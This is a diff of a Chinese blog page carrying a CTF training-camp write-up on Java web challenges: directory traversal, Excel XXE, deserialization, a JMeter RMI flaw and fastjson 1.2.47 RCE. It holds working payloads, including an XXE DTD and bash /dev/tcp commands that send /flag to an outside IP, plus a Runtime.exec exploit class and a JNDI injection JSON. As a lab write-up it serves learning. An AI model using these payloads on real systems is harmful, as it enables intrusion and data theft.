@@ -19,36 +19,36 @@
 
   
   <title>山石安研第一届CTF训练营 | 无名大仙</title>
-  <meta name="description" content="山石安研第一届CTF训练营 过去一周参加了山石安研的ctf训练营，做了几道题感觉还是颇有意义，虽然不难，但是算是某些类型的典型题吧，靶机可能访问不到了，不过关键还是在于记录下一些思路和分析过程吧  这些题目分别涉及目录穿越、Excel XXE、反序列化、RMI、fastjson 1.2.47 RCE、shiro反序列化CVE-2016-4437、spel注入等知识点 最后一道后来发现是p神的一道题">
+  <meta name="description" content="山石安研第一届CTF训练营  过去一周参加了山石安研的ctf训练营，做了几道题感觉还是颇有意义，虽然不难，但是算是某些类型的典型题吧，靶机可能访问不到了，不过关键还是在于记录下一些思路和分析过程吧  这些题目分别涉及目录穿越、Excel XXE、反序列化、RMI、fastjson 1.2.47 RCE、shiro反序列化CVE-2016-4437、spel注入等知识点 最后一道后来发现是p神的一">
 <meta property="og:type" content="article">
 <meta property="og:title" content="山石安研第一届CTF训练营">
 <meta property="og:url" content="https://vvmdx.github.io/2021/08/31/2021-08-31-%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8ACTF%E8%AE%AD%E7%BB%83%E8%90%A5/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="山石安研第一届CTF训练营 过去一周参加了山石安研的ctf训练营，做了几道题感觉还是颇有意义，虽然不难，但是算是某些类型的典型题吧，靶机可能访问不到了，不过关键还是在于记录下一些思路和分析过程吧  这些题目分别涉及目录穿越、Excel XXE、反序列化、RMI、fastjson 1.2.47 RCE、shiro反序列化CVE-2016-4437、spel注入等知识点 最后一道后来发现是p神的一道题">
+<meta property="og:description" content="山石安研第一届CTF训练营  过去一周参加了山石安研的ctf训练营，做了几道题感觉还是颇有意义，虽然不难，但是算是某些类型的典型题吧，靶机可能访问不到了，不过关键还是在于记录下一些思路和分析过程吧  这些题目分别涉及目录穿越、Excel XXE、反序列化、RMI、fastjson 1.2.47 RCE、shiro反序列化CVE-2016-4437、spel注入等知识点 最后一道后来发现是p神的一">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image1.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image2.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image3.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image4.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image5.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image6.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image7.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image8.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image9.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image10.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image11.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image12.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image13.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image14.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image15.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image16.png">
-<meta property="og:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image17.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image1.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image2.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image3.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image4.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image5.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image6.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image7.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image8.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image9.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image10.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image11.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image12.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image13.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image14.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image15.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image16.png">
+<meta property="og:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image17.png">
 <meta property="article:published_time" content="2021-08-30T16:00:00.000Z">
 <meta property="article:modified_time" content="2021-11-20T02:15:45.262Z">
 <meta property="article:author" content="vvmdx">
 <meta property="article:tag" content="WriteUp">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://vvmdx.github.io/images/CTF/山石安研第一届ctf训练营/image1.png">
+<meta name="twitter:image" content="https://vvmdx.github.io/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image1.png">
   <!-- Canonical links -->
   <link rel="canonical" href="https://vvmdx.github.io/2021/08/31/2021-08-31-%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8ACTF%E8%AE%AD%E7%BB%83%E8%90%A5/index.html">
   
@@ -322,7 +322,7 @@
   <div class="slimContent">
     <nav id="toc" class="article-toc">
       <h3 class="toc-title">文章目录</h3>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8ACTF%E8%AE%AD%E7%BB%83%E8%90%A5"><span class="toc-text">山石安研第一届CTF训练营</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%9C%E4%B8%9A%E4%B8%80wp"><span class="toc-text">作业一wp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%9C%E4%B8%9A%E4%BA%8Cwp"><span class="toc-text">作业二wp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%9C%E4%B8%9A%E4%B8%89wp"><span class="toc-text">作业三wp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%9C%E4%B8%9A%E5%9B%9Bwp"><span class="toc-text">作业四wp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ShiroSpel"><span class="toc-text">ShiroSpel</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5"><span class="toc-text"> 山石安研第一届CTF训练营</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%9C%E4%B8%9A%E4%B8%80wp"><span class="toc-text"> 作业一wp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%9C%E4%B8%9A%E4%BA%8Cwp"><span class="toc-text"> 作业二wp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%9C%E4%B8%9A%E4%B8%89wp"><span class="toc-text"> 作业三wp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%9C%E4%B8%9A%E5%9B%9Bwp"><span class="toc-text"> 作业四wp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#shirospel"><span class="toc-text"> ShiroSpel</span></a></li></ol>
     </nav>
   </div>
 </aside>
@@ -398,7 +398,8 @@
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <h1 id="山石安研第一届CTF训练营"><a href="#山石安研第一届CTF训练营" class="headerlink" title="山石安研第一届CTF训练营"></a>山石安研第一届CTF训练营</h1><blockquote>
+        <h1 id="山石安研第一届ctf训练营"><a class="markdownIt-Anchor" href="#山石安研第一届ctf训练营"></a> 山石安研第一届CTF训练营</h1>
+<blockquote>
 <p>过去一周参加了山石安研的ctf训练营，做了几道题感觉还是颇有意义，虽然不难，但是算是某些类型的典型题吧，靶机可能访问不到了，不过关键还是在于记录下一些思路和分析过程吧</p>
 </blockquote>
 <p>这些题目分别涉及目录穿越、Excel XXE、反序列化、RMI、fastjson 1.2.47 RCE、shiro反序列化CVE-2016-4437、spel注入等知识点</p>
@@ -406,21 +407,23 @@
 <p><a target="_blank" rel="noopener" href="https://github.com/phith0n/code-breaking/tree/master/2018/javacon">https://github.com/phith0n/code-breaking/tree/master/2018/javacon</a></p>
 <blockquote>
 <p>最近发现博客访问人数突然多了，，本来只想自己记录下学习过程，现在意外的发现还有分享的作用，顺便放几道代审题的附件吧</p>
-<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1I4z7-jBcOUyt1d4lDR-8zQ">https://pan.baidu.com/s/1I4z7-jBcOUyt1d4lDR-8zQ</a><br>提取码：2333</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1I4z7-jBcOUyt1d4lDR-8zQ">https://pan.baidu.com/s/1I4z7-jBcOUyt1d4lDR-8zQ</a><br />
+提取码：2333</p>
 </blockquote>
-<h1 id="作业一wp"><a href="#作业一wp" class="headerlink" title="作业一wp"></a>作业一wp</h1><ul>
+<h1 id="作业一wp"><a class="markdownIt-Anchor" href="#作业一wp"></a> 作业一wp</h1>
+<ul>
 <li><strong>知识点</strong>：任意文件下载、目录穿越、代码审计、Excel XXE</li>
 </ul>
 <p>地址：<a target="_blank" rel="noopener" href="http://58.240.236.228:32013/">http://58.240.236.228:32013/</a></p>
 <p>进去后是一个上传文件的地方，一开始还以为是上传个一句话木马的php，但是上传后发现他并不会解析成可访问路径，不过在下载文件的接口发现需要传一个filename，尝试更改一些其他的文件名，发现当文件名含有flag时会返回禁止读取，当传空参时回显500，爆出疑似项目路径</p>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image1.png" alt="image"></p>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image1.png" alt="image" /></p>
 <p>尝试目录穿越访问该web项目的配置文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># payload</span><br><span class="line">http://58.240.236.228:32013/file_in_java/DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image2.png" alt="image"></p>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image2.png" alt="image" /></p>
 <p>获取到项目源码的包名后，直接通过这个接口下载三个class文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># payload</span><br><span class="line">http://58.240.236.228:32013/file_in_java/DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</span><br></pre></td></tr></table></figure>
 <p>放入jd-gui反编译，重点关注UploadServlet，可以看到在红色框标识处的条件判断，当文件名以“excel-”开头且为“xlsx”后缀的文件时会使用POI解析这个excel文档，因此考虑excel xxe</p>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image3.png" alt="image"></p>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image3.png" alt="image" /></p>
 <p>首先新建一个.xlsx格式的excel文档，修改后缀名为.zip，然后解压，在<code>[Content_Types].xml</code>中插入一段xml，作用是从远程服务器获取evil.dtd文件，其中<code>%all;%send;</code>是定义在evil.dtd中的，evil.dtd作用是读取根目录下的flag文件并发送到远程服务器的9000端口</p>
 <ul>
 <li>[Content_Types].xml插入部分</li>
@@ -430,19 +433,20 @@
 <li>evil.dtd</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://1.14.169.109:9000?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image4.png" alt="image"></p>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image4.png" alt="image" /></p>
 <p>改完xml后将文件夹重新压缩回zip，然后文件名改为excel-.xlsx以满足条件判断让服务器解析该文档</p>
 <p>evil.dtd文件则上传到vps（我用的是腾讯云）</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scp 本地文件地址 vps账号@vps公网ip:服务器文件地址</span><br><span class="line">scp /mnt/hgfs/Kali_share/evil.dtd root@x.x.x.x:/root/evil.dtd</span><br><span class="line">然后输入vps密码就可以了</span><br></pre></td></tr></table></figure>
 <p>接着登录vps，进入evil.dtd所在的文件夹，用python开启一个web服务</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2 3使用方法不一样，但是效果一样</span></span><br><span class="line">python2 -m SimpleHTTPServer</span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
 <p>这个服务默认开启在8000端口，访问[ip:port]即可看到目录下的evil.dtd</p>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image5.png" alt="image"></p>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image5.png" alt="image" /></p>
 <p>接着根据我们写的evil.dtd，会将读取到的flag发送到9000端口，因此用nc监听该端口</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9000</span><br></pre></td></tr></table></figure>
 <p>然后上传文件即可发现服务器从我们的vps下载了evil.dtd，且将数据发送到了9000端口</p>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image6.png" alt="image"></p>
-<h1 id="作业二wp"><a href="#作业二wp" class="headerlink" title="作业二wp"></a>作业二wp</h1><ul>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image6.png" alt="image" /></p>
+<h1 id="作业二wp"><a class="markdownIt-Anchor" href="#作业二wp"></a> 作业二wp</h1>
+<ul>
 <li><strong>知识点</strong>：代码审计、反序列化</li>
 </ul>
 <p>直接idea打开项目，源码很少，只有一个类，直接看关键方法</p>
@@ -452,8 +456,9 @@
 <p>接下来我们只要逆向构造出一个满足条件的HashMap对象，并将其序列化后base64解密即可</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String strstr = <span class="string">&quot;iwantflag&quot;</span>;</span><br><span class="line">    HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="comment">// URL类的构造方法需要4个参数，其中第二个参数即为host，也就是getHost()方法获取到的参数，其他几个随便写就行</span></span><br><span class="line">    URL urlObj = <span class="keyword">new</span> URL(<span class="string">&quot;http&quot;</span>,<span class="string">&quot;iwantflag&quot;</span>,<span class="number">9000</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="comment">// 设置key-value对，关键是key必须为URL类的对象，value无所谓，用不到</span></span><br><span class="line">    hashMap.put(urlObj,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    Set&lt;Object&gt; objectSet = hashMap.keySet();</span><br><span class="line">    Iterator iterator = objectSet.iterator();</span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">        Object key = iterator.next();</span><br><span class="line">        <span class="keyword">if</span>(key.getClass() == URL.class)&#123;</span><br><span class="line">            String url = ((URL)key).getHost();</span><br><span class="line">            <span class="keyword">if</span>(url.contains(strstr))&#123;</span><br><span class="line">                <span class="comment">// 以上几行都是为了模拟正向读取flag进行的判断，实际上对流程没影响</span></span><br><span class="line">                ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">                <span class="comment">// 将HashMap序列化后写入流</span></span><br><span class="line">                outputStream.writeObject(hashMap);</span><br><span class="line">                outputStream.close();</span><br><span class="line">                <span class="comment">// 将流的字节数组base64加密</span></span><br><span class="line">                String encodeStr = <span class="keyword">new</span> BASE64Encoder().encode(baos.toByteArray());</span><br><span class="line">                <span class="comment">// 打印结果</span></span><br><span class="line">                System.out.println(encodeStr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>打印出来的结果直接丢到burp里面发送即可获取flag</p>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image7.png" alt="image"></p>
-<h1 id="作业三wp"><a href="#作业三wp" class="headerlink" title="作业三wp"></a>作业三wp</h1><ul>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image7.png" alt="image" /></p>
+<h1 id="作业三wp"><a class="markdownIt-Anchor" href="#作业三wp"></a> 作业三wp</h1>
+<ul>
 <li><strong>知识点</strong>：jmeter反序列化rce、CVE-2018-1297</li>
 </ul>
 <p>地址：58.240.236.228:31099（是个rmi服务）</p>
@@ -464,54 +469,63 @@
 <p>原cmd：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag &gt;&amp; /dev/tcp/ip/9000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 <p>转换后：</p>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image8.png" alt="image"></p>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image8.png" alt="image" /></p>
 <p>工具地址：<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image9.png" alt="image"></p>
-<h1 id="作业四wp"><a href="#作业四wp" class="headerlink" title="作业四wp"></a>作业四wp</h1><ul>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image9.png" alt="image" /></p>
+<h1 id="作业四wp"><a class="markdownIt-Anchor" href="#作业四wp"></a> 作业四wp</h1>
+<ul>
 <li><strong>知识点</strong>：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/fastjson/1.2.47-rce/">fastjson 1.2.47 RCE</a></li>
 </ul>
 <p>地址：58.240.236.228:38833</p>
 <p>访问后返回一个json格式化的数据</p>
 <ol>
-<li><p>抓包，修改GET为POST，添加头部<code>Content-Type: application/json</code>，发送一段不完整的json探测一下，确定是fastjson</p>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image10.png" alt="image"></p>
+<li>
+<p>抓包，修改GET为POST，添加头部<code>Content-Type: application/json</code>，发送一段不完整的json探测一下，确定是fastjson</p>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image10.png" alt="image" /></p>
 </li>
-</ol>
-<ol>
-<li><p>dnslog探测一下，没问题</p>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image11.png" alt="image"></p>
+<li>
+<p>dnslog探测一下，没问题</p>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image11.png" alt="image" /></p>
 </li>
-<li><p>首先编写Exploit.java，目的是让目标服务器通过rmi加载然后执行</p>
+<li>
+<p>首先编写Exploit.java，目的是让目标服务器通过rmi加载然后执行</p>
 <ul>
 <li>执行的命令为<code>cat /flag &gt;&amp; /dev/tcp/1ip/9000 0&gt;&amp;1</code>经过base64和shell编码编排后的结果</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">public class Exploit &#123;    </span><br><span class="line">	static &#123;        </span><br><span class="line">		try &#123;            </span><br><span class="line">			Runtime.getRuntime().exec(&quot;bash -c &#123;echo,Y2F0IC9mbGFnID4mIC9kZXYvdGNwLzEuMTQuMTY5LjEwOS85MDAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span><br><span class="line">		&#125; catch (IOException ignored) &#123;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>准备工具</p>
+<li>
+<p>准备工具</p>
 <ul>
-<li>官方项目<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec，可以自己打包为jar">https://github.com/mbechler/marshalsec，可以自己打包为jar</a></li>
-<li>打包好的：<a target="_blank" rel="noopener" href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE，还带有教程">https://github.com/CaijiOrz/fastjson-1.2.47-RCE，还带有教程</a></li>
+<li>官方项目https://github.com/mbechler/marshalsec，可以自己打包为jar</li>
+<li>打包好的：<a target="_blank" rel="noopener" href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE%EF%BC%8C%E8%BF%98%E5%B8%A6%E6%9C%89%E6%95%99%E7%A8%8B">https://github.com/CaijiOrz/fastjson-1.2.47-RCE，还带有教程</a></li>
 </ul>
 </li>
-<li><p>将jar包和Exploit一起上传到vps</p>
+<li>
+<p>将jar包和Exploit一起上传到vps</p>
 <ul>
-<li><p>在目录下开启web服务</p>
+<li>
+<p>在目录下开启web服务</p>
 <p><code>python3 -m http.server</code></p>
 </li>
-<li><p>监听9000端口</p>
+<li>
+<p>监听9000端口</p>
 <p><code>nc -lvvp 9000</code></p>
 </li>
-<li><p>开启rmi服务</p>
+<li>
+<p>开启rmi服务</p>
 <p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://ip:8000/#Exploit&quot; 9999</code></p>
 </li>
 </ul>
 </li>
-<li><p>发送payload到服务器即可</p>
+<li>
+<p>发送payload到服务器即可</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;a&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="attr">&quot;b&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://ip:9999/Exploit&quot;</span>,<span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="/images/CTF/山石安研第一届ctf训练营/image12.png" alt="image"></p>
+<p><img src="/images/CTF/%E5%B1%B1%E7%9F%B3%E5%AE%89%E7%A0%94%E7%AC%AC%E4%B8%80%E5%B1%8Actf%E8%AE%AD%E7%BB%83%E8%90%A5/image12.png" alt="image" /></p>
 </li>
 </ol>
-<h1 id="ShiroSpel"><a href="#ShiroSpel" class="headerlink" title="ShiroSpel"></a>ShiroSpel</h1><ul>
+<h1 id="shirospel"><a class="markdownIt-Anchor" href="#shirospel"></a> ShiroSpel</h1>
+<ul>
